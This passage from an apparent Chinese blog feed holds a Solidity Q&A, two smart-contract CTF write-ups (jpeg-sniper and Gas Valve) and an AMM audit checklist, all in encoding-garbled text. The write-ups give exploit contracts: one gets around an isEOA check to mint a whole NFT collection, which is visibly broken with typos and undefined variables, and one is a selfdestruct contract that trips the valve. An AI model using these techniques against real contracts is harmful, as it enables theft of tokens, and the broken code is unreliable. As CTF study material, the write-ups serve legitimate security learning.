å‘ç”Ÿäº†ä»€ä¹ˆå˜åŒ–ï¼Ÿ</p><ul><li>åœ¨PoWåè®®ä¸­ï¼Œ<code>block.timestamp</code>è¡¨ç¤ºçŸ¿å·¥å¼€å§‹æŒ–æ˜æ–°å—çš„æ—¶é—´æˆ³ã€‚åœ¨PoSåè®®ä¸­ï¼Œ<code>block.timestamp</code>è¡¨ç¤ºéªŒè¯å™¨å¼€å§‹éªŒè¯æ–°å—çš„æ—¶é—´æˆ³ã€‚</li></ul><p>4,ä»€ä¹ˆæ˜¯æŠ¢è·‘ï¼ˆfrontrunningï¼‰ï¼Ÿ</p><ul><li>æŠ¢è·‘å°±æ˜¯æŠ¢å…ˆåœ¨åˆ«äººçš„äº¤æ˜“çš„æ‰§è¡Œå‰æ‰§è¡Œ,å®ƒæ˜¯é€šè¿‡æäº¤æ›´é«˜çš„gasè´¹ç”¨æ¥è¾¾åˆ°çš„</li></ul><p>5,ä»¥å¤ªåŠå¦‚ä½•ç¡®å®š EIP-1559 ä¸­çš„ <code>BASEFEE</code></p><ul><li><code>BASEFEE</code>æ˜¯ç”±ä»¥å¤ªåŠç½‘ç»œæ ¹æ®äº¤æ˜“éœ€æ±‚å’ŒåŒºå—å¤§å°åŠ¨æ€è°ƒæ•´çš„ã€‚<code>BASEFEE</code>çš„è®¡ç®—æ–¹å¼æ˜¯é€šè¿‡ä¸€ä¸ªåä¸ºâ€œåŸºç¡€è´¹ç”¨è¿½è¸ªå™¨â€çš„ç®—æ³•æ¥å®ç°çš„ã€‚è¯¥ç®—æ³•ä¼šæ ¹æ®å½“å‰åŒºå—çš„äº¤æ˜“éœ€æ±‚å’ŒåŒºå—å¤§å°æ¥åŠ¨æ€è°ƒæ•´<code>BASEFEE</code>ï¼Œä»¥ç¡®ä¿äº¤æ˜“èƒ½å¤Ÿåœ¨åˆç†çš„æ—¶é—´å†…å¾—åˆ°ç¡®è®¤ã€‚</li></ul><p>6,ä»€ä¹ˆæ˜¯ <code>commit-reveal</code> æ–¹æ¡ˆï¼Œä½•æ—¶ä½¿ç”¨å®ƒï¼Ÿ</p><ul><li>æäº¤-æ­ç¤ºæ–¹æ¡ˆï¼ˆ<code>Commit-Reveal Scheme</code>ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨åŒºå—é“¾ä¸Šè¿›è¡ŒæŠ•ç¥¨æˆ–ç«æ ‡çš„åè®®ã€‚è¯¥åè®®çš„ç›®çš„æ˜¯é˜²æ­¢å‚ä¸è€…åœ¨æäº¤æŠ•ç¥¨æˆ–ç«æ ‡ä¹‹å‰æŸ¥çœ‹å…¶ä»–å‚ä¸è€…çš„æäº¤ï¼Œä»è€Œä¿æŠ¤æŠ•ç¥¨æˆ–ç«æ ‡çš„å…¬æ­£æ€§ã€‚</li></ul><p>7,åœ¨ä»€ä¹ˆæƒ…å†µä¸‹ï¼Œ<code>abi.encodePacked</code> å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ï¼Ÿ</p><ul><li><code> abi.encodePacked</code>å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ï¼Œå› ä¸ºå®ƒä¸ä¼šåœ¨å‚æ•°ä¹‹é—´æ·»åŠ å¡«å……ï¼Œè€Œæ˜¯å°†æ‰€æœ‰å‚æ•°æ‹¼æ¥åœ¨ä¸€èµ·ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´å“ˆå¸Œç¢°æ’ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿä¼ªé€ äº¤æ˜“æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ”»å‡»è€…çŸ¥é“æ‚¨ä½¿ç”¨<code>abi.encodePacked</code>æ¥ç¼–ç äº¤æ˜“æ•°æ®ï¼Œä»–ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªå…·æœ‰ç›¸åŒå“ˆå¸Œå€¼çš„äº¤æ˜“ï¼Œä»è€Œæ¬ºéª—æ‚¨çš„æ™ºèƒ½åˆçº¦ã€‚</li></ul><p>8,AMM å¦‚ä½•å®šä»·èµ„äº§ï¼Ÿ</p><ul><li>é€šè¿‡æ’å®šä¹˜ç§¯ç®—æ³•ï¼Œa * b &#x3D; k ,å…‘æ¢ mä¸ªa éœ€è¦çš„bæ•°é‡ç®—æ³• &#x3D; k&#x2F;(a+m) - b ,è¿™é‡Œæ²¡è®¡ç®—æ‰‹ç»­è´¹ã€‚</li></ul><p>9, å‡½æ•°å‚æ•°ä¸­çš„ memory å’Œ calldata æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li>memoryï¼šç”¨äºå£°æ˜å‡½æ•°å‚æ•°å°†è¢«å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚å†…å­˜ä¸­çš„æ•°æ®åªåœ¨å‡½æ•°æ‰§è¡ŒæœŸé—´å­˜åœ¨ï¼Œæ‰§è¡Œå®Œæ¯•åå°±è¢«é”€æ¯ã€‚åœ¨å‡½æ•°å†…éƒ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨memoryå…³é”®å­—æ¥åˆ›å»ºä¸´æ—¶å˜é‡ï¼Œä½†æ˜¯ä¸èƒ½åœ¨å‡½æ•°ä¹‹å¤–ä½¿ç”¨å®ƒä»¬ã€‚åœ¨å‡½æ•°è°ƒç”¨æœŸé—´ï¼Œå‡½æ•°å‚æ•°çš„å€¼å°†ä»è°ƒç”¨æ–¹å¤åˆ¶åˆ°å†…å­˜ä¸­ï¼Œå¹¶åœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•åè¢«é”€æ¯ã€‚<br>calldataï¼šç”¨äºå£°æ˜å‡½æ•°å‚æ•°å°†è¢«å­˜å‚¨åœ¨è°ƒç”¨æ•°æ®åŒºåŸŸä¸­ã€‚è°ƒç”¨æ•°æ®åŒºåŸŸæ˜¯ä¸€ä¸ªä¸å¯ä¿®æ”¹çš„åŒºåŸŸï¼Œç”¨äºä¿å­˜å‡½æ•°å‚æ•°ã€‚åœ¨å‡½æ•°å†…éƒ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨calldataå…³é”®å­—æ¥è®¿é—®å‡½æ•°å‚æ•°ï¼Œä½†æ˜¯ä¸èƒ½åœ¨å‡½æ•°ä¹‹å¤–ä½¿ç”¨å®ƒä»¬ã€‚åœ¨å‡½æ•°è°ƒç”¨æœŸé—´ï¼Œå‡½æ•°å‚æ•°çš„å€¼å°†ä»è°ƒç”¨æ–¹å¤åˆ¶åˆ°è°ƒç”¨æ•°æ®åŒºåŸŸä¸­ï¼Œå¹¶åœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•åè¢«é”€æ¯</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-jpeg-sniper</title>
      <link href="/2024/10/19/CTF-jpeg-sniper/"/>
      <url>/2024/10/19/CTF-jpeg-sniper/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-jpeg-sniper"><a href="#CTF-jpeg-sniper" class="headerlink" title="CTF-jpeg-sniper"></a>CTF-jpeg-sniper</h1><p>è¿™é“é¢˜çš„æºç åœ¨<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/main/src/jpeg-sniper">è¿™é‡Œ</a></p><p>é¢˜ç›®çš„è¦æ±‚æ˜¯ï¼šé“¸å¸</p><p>é¦–å…ˆåˆæ˜¯è¦ç†è§£è¿™äº›ä»£ç æƒ³è¡¨è¾¾çš„æ„æ€</p><p><code>BaseLaunchpegNTF</code>åˆçº¦ï¼Œè¿™ä¸ªNTFçš„åŸå‹ï¼Œé‡Œé¢å®ç°äº†isEOAçš„ä¿®é¥°å™¨ï¼Œçœ‹åˆ°è¿™ä¸ªï¼Œæˆ‘å°±æƒ³èµ·äº†å‰å‡ å¤©æ‰æ•´ç†çš„æ™ºèƒ½åˆçº¦çš„æ¼æ´ï¼šå¦‚ä½•ç»•è¿‡å¤–éƒ¨è´¦æˆ·ï¼Œå®ç°ç”¨åˆçº¦è°ƒç”¨ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ™®é€šçš„é“¸å¸æµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function numberMinted(address _owner)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return balanceOf(_owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _tokenId.current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// æ¯ä¸ªä½¿ç”¨è€…å¯é“¸å¸çš„æ•°é‡</span><br><span class="line">    function _mintForUser(address to, uint256 quantity) internal &#123;</span><br><span class="line">        for (uint256 i=0; i&lt;quantity; i++) &#123;</span><br><span class="line">            _mint(to, _tokenId.current());</span><br><span class="line">            _tokenId.increment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _refundIfOver(uint256 _price) internal &#123;</span><br><span class="line">        if (msg.value &lt; _price) &#123;</span><br><span class="line">            revert Launchpeg__NotEnoughFunds(msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">        if (msg.value &gt; _price) &#123;</span><br><span class="line">            (bool success, ) = msg.sender.call&#123;value: msg.value - _price&#125;(&quot;&quot;);</span><br><span class="line">            if (!success) &#123;</span><br><span class="line">                revert Launchpeg__TransferFailed();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜å°±æ˜¯å‡ºåœ¨<code>FlatLaunchpeg</code>åˆçº¦ä¸­ï¼Œä»è¿™ä¸ªåˆçº¦ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª<code>publicSaleMint</code>å‡½æ•°,è¿™æ˜¯æˆ‘ä»¬ä¸»è¦å¯ä»¥è°ƒç”¨çš„é“¸å¸å‡½æ•°ï¼Œä¸€çœ‹ï¼Œæœç„¶ï¼Œæœ‰isEOAçš„ä¿®é¥°ï¼Œéš¾ç‚¹ä¹Ÿå°±æ˜¯è¿™ä¸ªäº†ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function publicSaleMint(uint256 _quantity)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        isEOA </span><br><span class="line">        atPhase(Phase.PublicSale)</span><br><span class="line">    &#123;</span><br><span class="line">        if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123;</span><br><span class="line">            revert Launchpeg__CanNotMintThisMany();</span><br><span class="line">        &#125;</span><br><span class="line">        if (totalSupply() + _quantity &gt; collectionSize) &#123;</span><br><span class="line">            revert Launchpeg__MaxSupplyReached();</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 total = salePrice * _quantity;</span><br><span class="line"></span><br><span class="line">        _mintForUser(msg.sender, _quantity);</span><br><span class="line">        _refundIfOver(total);</span><br><span class="line">    &#125;</span><br><span class="line">    function currentPhase() public view returns (Phase) &#123;</span><br><span class="line">        if (</span><br><span class="line">            publicSaleStartTime == 0 ||</span><br><span class="line">            block.timestamp &lt; publicSaleStartTime</span><br><span class="line">        ) &#123;</span><br><span class="line">            return Phase.NotStarted;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return Phase.PublicSale;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è”æƒ³åˆ°ä¹‹å‰æ•´ç†çš„æ¼æ´ï¼Œæƒ³åˆ°ï¼Œå¯ä»¥ä½¿ç”¨åœ¨æ”»å‡»åˆçº¦ä¸­çš„æ„é€ å‡½æ•°è°ƒç”¨å³å¯,ä¸ºäº†åœ¨ä¸€ä¸ªäº¤æ˜“å®Œæˆï¼Œå°±å†™äº†ä¿©ä¸ªåˆçº¦æ¥å®ç°æ­¤æ¬¡çš„æ”»å‡»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IFlatLaunchpeg&#123;</span><br><span class="line">   function publicSaleMint(uint256 _quantity) external payable;</span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function maxPerAddressDuringMint() external returns (uint256);</span><br><span class="line">    function collectionSize() external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">constract hack1&#123;</span><br><span class="line">    IFlatLaunchpeg nft;</span><br><span class="line">    address attracker;</span><br><span class="line">    contructor(address _nft,address _attracker)&#123;</span><br><span class="line">        runExploit(nft,attracker);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function runExpoit (address nft,attracker) public&#123;</span><br><span class="line">         IFlatLaunchpeg nft = IFlatLaunchpeg(nftAddress);</span><br><span class="line"></span><br><span class="line">        uint256 collectionSize = nft.collectionSize();//æ€»å…±çš„NFT</span><br><span class="line">        uint256 maxPerAddress = nft.maxPerAddressDuringMint();//æ¯ä¸ªåˆçº¦åœ°å€å¯ä»¥é“¸å¸çš„æœ€å¤§æ•°é‡</span><br><span class="line"></span><br><span class="line">        uint256 startIndex = nft.totalSupply();//å·²ç»é“¸å¸çš„æ•°é‡ï¼Œä¹Ÿæ˜¯æ ‡è¯†ç¬¦</span><br><span class="line">        uint256 loops = (collectionSize-startIndex)/maxPerAddress;</span><br><span class="line"></span><br><span class="line">        for (uint i = 0;i&lt;maxPerAddress;i++)&#123;</span><br><span class="line">            new hack2(ntf,attrackerï¼ŒmaxPerAddress,stratIndex);</span><br><span class="line">            startIndex +=maxPerAddress;</span><br><span class="line">        &#125;</span><br><span class="line">         //è½¬ç§»å‰©ä¸‹çš„å¯ä»¥é“¸å¸çš„æ•°é‡</span><br><span class="line">          uint256 mintRemainder = (collectionSize-startIndex)%maxPerAddress;</span><br><span class="line">        if (mintRemainder &gt; 0) new MiniJpegSniperExploiter(nft,to,mintRemainder,startIndex);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack2&#123;</span><br><span class="line">    //stratIndex æ˜¯è½¬ç§»çš„ä»£å¸IDï¼Œå› ä¸ºæ¯ä¸ªä»£å¸è¢«é“¸å‡ºæ¥ï¼Œéƒ½æœ‰ä¸€ä¸ªæ ‡è¯†IDï¼Œä¸è¦è¯¯è®¤ä¸ºæ˜¯è½¬ç§»è¿™ä¹ˆå¤šä»£å¸</span><br><span class="line">    constructor(IFlatLaunchpeg nft,address attracker,uint256 maxPerAddress,uint256 startIndex)&#123;</span><br><span class="line">        ntf.publicSaleMint(maxPerAddress);</span><br><span class="line">        for(uint i = 0;i&lt;per;i++)&#123;</span><br><span class="line">            nft.transferFrom(address(this),attracker,startIndex+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜è¦æƒ³è§£å†³ï¼Œå°±æ˜¯è¦å¯¹é“¸å¸NFTæœ‰ä¸€äº›äº†è§£ï¼Œæ‰§è¡Œæ”»å‡»åˆçº¦å³å¯å®Œæˆï¼›</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-GasValue</title>
      <link href="/2024/10/16/CTF-GasValue/"/>
      <url>/2024/10/16/CTF-GasValue/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-GasValue"><a href="#CTF-GasValue" class="headerlink" title="CTF-GasValue"></a>CTF-GasValue</h1><p>è¿™ä¸ªé¢˜è¦æ±‚æˆ‘ä»¬ä½¿openä¸ºfaluse<br>æºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface INozzle &#123;</span><br><span class="line">    function insert() external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @title Gas Valve</span><br><span class="line">/// @author https://twitter.com/bahurum</span><br><span class="line">/// @notice The evil Dr. N. Gas has created a machine to suck all the air out of the atmosphere. Anon, you must deactivate it before it&#x27;s too late!</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/gas-valve</span><br><span class="line">contract Valve &#123;</span><br><span class="line">    bool public open;</span><br><span class="line">    bool public lastResult;</span><br><span class="line"></span><br><span class="line">    function useNozzle(INozzle nozzle) public returns (bool) &#123;</span><br><span class="line">        try nozzle.insert() returns (bool result) &#123;</span><br><span class="line">            lastResult = result;</span><br><span class="line">            return result;</span><br><span class="line">        &#125; catch &#123;</span><br><span class="line">            lastResult = false;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function openValve(INozzle nozzle) external &#123;</span><br><span class="line">        open = true;</span><br><span class="line">        (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle));</span><br><span class="line">        require(!success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°è¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œå‘ç°å‰ä¿©å¤©æ‰åœ¨javaè¯¾ä¸Šå­¦ä¹ åˆ°äº†try catchçš„æŠ›å‡ºé”™è¯¯çš„ç”¨æ³•ï¼Œä»Šå¤©å°±åœ¨solidityä¸­çœ‹è§äº†ï¼Œåªä¸è¿‡Javaä¸­try catchä¸ä»…æ£€æŸ¥è‡ªå·±æœ¬èº«ç¨‹åºæ˜¯å¦æœ‰å¼‚å¸¸ï¼Œè¿˜å¤šä¸ªfinallyçš„ç”¨æ³•ï¼Œè€Œsolidityä¸­ï¼Œtry catchç”¨æ³•ä¸»è¦å¤„ç†è°ƒç”¨å¤–éƒ¨å‡½æ•°çš„å¼‚å¸¸</p><p>åˆ†æé¢˜ç›®ï¼šæœ‰æ¥å£<code>INozzle</code>,try catch ä¸»è¦å°±æ˜¯æ£€æŸ¥è°ƒç”¨æ¥å£ä¸­insertå‡½æ•°æ˜¯å¦æœ‰é”™è¯¯ï¼Œç„¶åçœ‹åˆ°openValueå‡½æ•°ä¸­å±…ç„¶æŠŠopendè®¾ç½®ä¸ºfalse,è€Œæˆ‘æœ‰æ²¡æœ‰å‘ç°å¦‚ä½•æ‰èƒ½æ”¹å˜opendå€¼çš„åœ°æ–¹ï¼Œå°±é™·å…¥äº†å›°å¢ƒï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹åˆ«äººçš„æ€è·¯ï¼ŒåŸæ¥è¿™é“é¢˜çš„å…³é”®ç‚¹æ˜¯å¦‚ä½•æ¶ˆè€—å®Œgas,å¹¶ä¸”ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼ŒæŸ¥çœ‹è¿™ä¸ª<a href="https://ethereum.stackexchange.com/questions/594/how-do-gas-refunds-work">é—®ç­”</a>,äº†è§£åˆ°Gas refunds are provided when clearing storage or calling on contracts.SELFDESTRUCTï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åœ¨è°ƒç”¨insertå‡½æ•°ä¸­ï¼Œä½¿ç”¨è‡ªæ¯åˆçº¦ï¼Œé€€å›gasè´¹ç”¨ï¼Œå¹¶ä¸”ä¸ä¼šæŠ›å‡ºé”™è¯¯<br>æ”»å‡»åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract ValveHacker &#123;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function insert() public returns (bool result) &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæˆã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMMæ¼æ´åˆ†æ</title>
      <link href="/2024/10/16/AMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/16/AMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="æ˜¯å¦ä½¿ç”¨ç¡¬ç¼–ç æ»‘ç‚¹"><a href="#æ˜¯å¦ä½¿ç”¨ç¡¬ç¼–ç æ»‘ç‚¹" class="headerlink" title="æ˜¯å¦ä½¿ç”¨ç¡¬ç¼–ç æ»‘ç‚¹"></a>æ˜¯å¦ä½¿ç”¨ç¡¬ç¼–ç æ»‘ç‚¹</h3><p>åœ¨é«˜æ³¢åŠ¨æ—¶æœŸï¼Œä½¿ç”¨ç¡¬ç¼–ç æ»‘ç‚¹ä¼šå¯¼è‡´äº¤æ˜“ä¸ä½³å¹¶å†»ç»“ç”¨æˆ·èµ„é‡‘</p><h3 id="æœ‰æˆªæ­¢æ—¥æœŸä¿æŠ¤å—"><a href="#æœ‰æˆªæ­¢æ—¥æœŸä¿æŠ¤å—" class="headerlink" title="æœ‰æˆªæ­¢æ—¥æœŸä¿æŠ¤å—"></a>æœ‰æˆªæ­¢æ—¥æœŸä¿æŠ¤å—</h3><p>å¦‚æœæ²¡æœ‰æˆªè‡³æ—¥æœŸä¿æŠ¤ï¼Œç”¨æˆ·äº¤æ˜“è¡¡å®¹æ˜“æ”¶åˆ°Sandwichæ”»å‡»</p><h3 id="æ˜¯å¦é’ˆå¯¹åè®®å‚¨å¤‡çš„éªŒè¯æ£€æŸ¥"><a href="#æ˜¯å¦é’ˆå¯¹åè®®å‚¨å¤‡çš„éªŒè¯æ£€æŸ¥" class="headerlink" title="æ˜¯å¦é’ˆå¯¹åè®®å‚¨å¤‡çš„éªŒè¯æ£€æŸ¥"></a>æ˜¯å¦é’ˆå¯¹åè®®å‚¨å¤‡çš„éªŒè¯æ£€æŸ¥</h3><p>å¦‚æœå‚¨å¤‡é‡‘æœªç»éªŒè¯ï¼Œåè®®å¯èƒ½ä¼šé¢ä¸´é£é™©ï¼Œå¹¶ä¸”å¯ä»¥å€Ÿå‡ºï¼Œä»è€Œå½±å“ç³»ç»Ÿçš„å¿ä»˜èƒ½åŠ›ã€‚</p><h3 id="AMMæ˜¯å¦ä½¿ç”¨åˆ†å‰ä»£ç "><a href="#AMMæ˜¯å¦ä½¿ç”¨åˆ†å‰ä»£ç " class="headerlink" title="AMMæ˜¯å¦ä½¿ç”¨åˆ†å‰ä»£ç "></a>AMMæ˜¯å¦ä½¿ç”¨åˆ†å‰ä»£ç </h3><p>å¦‚æœä½¿ç”¨äº†åˆ†å‰ä»£ç ï¼Œå°¤å…¶æ˜¯æ¥è‡ªUniswapç­‰å·²çŸ¥é¡¹ç›®çš„ä»£ç ï¼Œå¹¶ä¸”è¿™äº›ä»£ç æ²¡æœ‰è¿›è¡Œæ­£ç¡®æ›´æ–°ï¼Œæˆ–è€…å®¡è®¡ï¼Œå¯èƒ½ä¼šå¼•å…¥å·²çŸ¥çš„æ¼æ´</p><h3 id="äº§å“å¸¸æ•°å…¬å¼ä¸­æ˜¯å¦å­˜åœ¨èˆå…¥é—®é¢˜"><a href="#äº§å“å¸¸æ•°å…¬å¼ä¸­æ˜¯å¦å­˜åœ¨èˆå…¥é—®é¢˜" class="headerlink" title="äº§å“å¸¸æ•°å…¬å¼ä¸­æ˜¯å¦å­˜åœ¨èˆå…¥é—®é¢˜"></a>äº§å“å¸¸æ•°å…¬å¼ä¸­æ˜¯å¦å­˜åœ¨èˆå…¥é—®é¢˜</h3><p>å…¬å¼ä¸­çš„å››èˆäº”å…¥é—®é¢˜å¯èƒ½å¯¼è‡´ä»£å¸äº¤æ¢å’ŒæµåŠ¨æ€§ä¾›åº”ä¸å‡†ç¡®æˆ–ä¸å¹³è¡¡ã€‚</p><h3 id="æ˜¯å¦å¯ä»¥æ ¹æ®ç”¨æˆ·è¾“å…¥è¿›è¡Œä»»æ„è°ƒç”¨"><a href="#æ˜¯å¦å¯ä»¥æ ¹æ®ç”¨æˆ·è¾“å…¥è¿›è¡Œä»»æ„è°ƒç”¨" class="headerlink" title="æ˜¯å¦å¯ä»¥æ ¹æ®ç”¨æˆ·è¾“å…¥è¿›è¡Œä»»æ„è°ƒç”¨"></a>æ˜¯å¦å¯ä»¥æ ¹æ®ç”¨æˆ·è¾“å…¥è¿›è¡Œä»»æ„è°ƒç”¨</h3><p>å…è®¸åŸºäºç”¨æˆ·è¾“å…¥çš„ä»»æ„è°ƒç”¨å¯èƒ½ä¼šä½¿åˆçº¦é¢ä¸´å„ç§æ¼æ´</p><h3 id="æ˜¯å¦æœ‰é€‚å½“çš„æœºåˆ¶æ¥é˜²æ­¢è¿‡åº¦æ»‘ç‚¹"><a href="#æ˜¯å¦æœ‰é€‚å½“çš„æœºåˆ¶æ¥é˜²æ­¢è¿‡åº¦æ»‘ç‚¹" class="headerlink" title="æ˜¯å¦æœ‰é€‚å½“çš„æœºåˆ¶æ¥é˜²æ­¢è¿‡åº¦æ»‘ç‚¹"></a>æ˜¯å¦æœ‰é€‚å½“çš„æœºåˆ¶æ¥é˜²æ­¢è¿‡åº¦æ»‘ç‚¹</h3><p>å¦‚æœæ²¡æœ‰æ»‘ç‚¹ä¿æŠ¤ï¼Œäº¤æ˜“è€…å¯èƒ½ä¼šå› äº¤æ˜“è¿‡ç¨‹ä¸­çš„å·¨å¤§ä»·æ ¼åå·®è€Œé­å—æ„å¤–æŸå¤±ã€‚</p><h3 id="AMMæ˜¯å¦æ­£ç¡®å¤„ç†ä¸åŒåè¿›åˆ¶é…ç½®å’Œä»¤ç‰Œ"><a href="#AMMæ˜¯å¦æ­£ç¡®å¤„ç†ä¸åŒåè¿›åˆ¶é…ç½®å’Œä»¤ç‰Œ" class="headerlink" title="AMMæ˜¯å¦æ­£ç¡®å¤„ç†ä¸åŒåè¿›åˆ¶é…ç½®å’Œä»¤ç‰Œ"></a>AMMæ˜¯å¦æ­£ç¡®å¤„ç†ä¸åŒåè¿›åˆ¶é…ç½®å’Œä»¤ç‰Œ</h3><p>å¦‚æœ AMM ä¸æ”¯æŒå…·æœ‰ä¸åŒå°æ•°æˆ–ç±»å‹çš„ä»¤ç‰Œï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´è®¡ç®—é”™è¯¯å’Œæ½œåœ¨æŸå¤±ã€‚</p><h3 id="AMMæ˜¯å¦æ”¯æŒè½¬è´¦æ”¶è´¹ä»£å¸"><a href="#AMMæ˜¯å¦æ”¯æŒè½¬è´¦æ”¶è´¹ä»£å¸" class="headerlink" title="AMMæ˜¯å¦æ”¯æŒè½¬è´¦æ”¶è´¹ä»£å¸"></a>AMMæ˜¯å¦æ”¯æŒè½¬è´¦æ”¶è´¹ä»£å¸</h3><p>è½¬è´¦æ”¶è´¹ä»£å¸å¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ï¼Œå› ä¸ºå‘é€é‡‘é¢å’Œæ¥æ”¶é‡‘é¢ä¸åŒ¹é…ã€‚</p><h3 id="åè®®æ˜¯å¦åœ¨ä»£å¸äº¤æ¢ä¹‹å‰è®¡ç®—â€minAmountOutâ€"><a href="#åè®®æ˜¯å¦åœ¨ä»£å¸äº¤æ¢ä¹‹å‰è®¡ç®—â€minAmountOutâ€" class="headerlink" title="åè®®æ˜¯å¦åœ¨ä»£å¸äº¤æ¢ä¹‹å‰è®¡ç®—â€minAmountOutâ€"></a>åè®®æ˜¯å¦åœ¨ä»£å¸äº¤æ¢ä¹‹å‰è®¡ç®—â€minAmountOutâ€</h3><p>é›†æˆ AMM çš„åè®®åº”åœ¨æ‰æœŸä¹‹å‰ç¡®å®š â€˜minAmountOutâ€™ï¼Œä»¥é¿å…ä¸åˆ©çš„æ±‡ç‡ã€‚è¿˜åº”è€ƒè™‘é€Ÿç‡çš„æ¥æºå’Œæ“çºµçš„å¯èƒ½æ€§ã€‚</p><h3 id="é›†æˆåˆçº¦æ˜¯å¦åœ¨å…¶å›è°ƒå‡½æ•°ä¸­éªŒè¯è°ƒç”¨è€…åœ°å€"><a href="#é›†æˆåˆçº¦æ˜¯å¦åœ¨å…¶å›è°ƒå‡½æ•°ä¸­éªŒè¯è°ƒç”¨è€…åœ°å€" class="headerlink" title="é›†æˆåˆçº¦æ˜¯å¦åœ¨å…¶å›è°ƒå‡½æ•°ä¸­éªŒè¯è°ƒç”¨è€…åœ°å€"></a>é›†æˆåˆçº¦æ˜¯å¦åœ¨å…¶å›è°ƒå‡½æ•°ä¸­éªŒè¯è°ƒç”¨è€…åœ°å€</h3><p>å¦‚æœå›è°ƒå‡½æ•°ä¸éªŒè¯è°ƒç”¨åˆçº¦çš„åœ°å€ï¼Œåˆ™å¯ä»¥æ“çºµå›è°ƒå‡½æ•°ã€‚è¿™å¯¹äºåƒ â€˜swapï¼ˆï¼‰â€™ è¿™æ ·æ¶‰åŠä»£å¸æˆ–èµ„äº§çš„å‡½æ•°å°¤å…¶é‡è¦ã€‚</p><h3 id="åœ¨èµ„é‡‘è½¬ç§»ç»™ç”¨æˆ·ä¹‹å‰çš„æœ€åä¸€æ­¥æ˜¯å¦å¼ºåˆ¶æ‰§è¡Œæ»‘ç‚¹å‚æ•°"><a 